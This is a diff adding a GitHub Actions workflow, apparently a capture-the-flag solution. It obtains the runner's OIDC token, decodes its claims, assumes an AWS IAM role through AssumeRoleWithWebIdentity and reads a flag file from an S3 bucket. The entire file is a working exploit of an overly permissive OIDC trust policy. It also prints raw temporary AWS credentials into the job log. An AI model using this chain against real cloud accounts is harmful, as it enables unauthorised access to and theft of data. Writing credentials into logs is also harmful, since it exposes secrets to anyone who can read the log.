@@ -1,0 +1,73 @@
+name: Get Flag (no uses)
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+    paths:
+      - .github/workflows/get-flag-no-uses.yml
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print OIDC env
+        run: |
+          echo "ACTIONS_ID_TOKEN_REQUEST_URL=${ACTIONS_ID_TOKEN_REQUEST_URL-<unset>}"
+          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN set? $([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN-}" ] && echo yes || echo no)"
+
+      - name: Request OIDC token and dump claims
+        shell: bash
+        run: |
+          set -euo pipefail
+          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}"
+          TOK="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
+          RESP="$(curl -sS -H "Authorization: bearer $TOK" "${URL}&audience=sts.amazonaws.com")"
+          printf "%s" "$RESP" > oidc_response.json
+          python3 - <<'PY'
+import json,base64,sys,pathlib
+p=pathlib.Path
+data=json.load(open("oidc_response.json"))
+tok=data.get("value","")
+p("idtoken.jwt").write_text(tok)
+def b64d(s): s+="="*(-len(s)%4); return base64.urlsafe_b64decode(s)
+hdr=json.loads(b64d(tok.split(".")[0]))
+pl =json.loads(b64d(tok.split(".")[1]))
+p("payload.json").write_text(json.dumps(pl, indent=2))
+print("sub:", pl.get("sub"))
+print("repository:", pl.get("repository"))
+print("ref:", pl.get("ref"))
+print("aud:", pl.get("aud"))
+PY
+          sed -n '1,120p' payload.json || true
+
+      - name: AssumeRoleWithWebIdentity (AWS CLI)
+        shell: bash
+        run: |
+          set -euo pipefail
+          ROLE="arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
+          aws --version
+          CREDS_JSON="$(aws sts assume-role-with-web-identity \
+              --role-arn "$ROLE" \
+              --role-session-name "GHA-NoUses-${{ github.run_id }}" \
+              --web-identity-token "file://idtoken.jwt" \
+              --duration-seconds 900 \
+              --output json || true)"
+          printf "%s" "$CREDS_JSON" > creds.json
+          head -c 800 creds.json; echo
+          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' < creds.json 2>/dev/null || echo)
+          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' < creds.json 2>/dev/null || echo)
+          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' < creds.json 2>/dev/null || echo)
+          echo "AKID=${AWS_ACCESS_KEY_ID:0:4}..."
+
+      - name: Try read flag.txt
+        shell: bash
+        run: |
+          set -euo pipefail
+          aws s3 cp s3://oh-i-really-do-care/flag.txt ./real_flag.txt || true
+          echo "---- BEGIN FLAG ----"
+          sed -n '1,200p' real_flag.txt || true
+          echo "-----  END FLAG  -----"
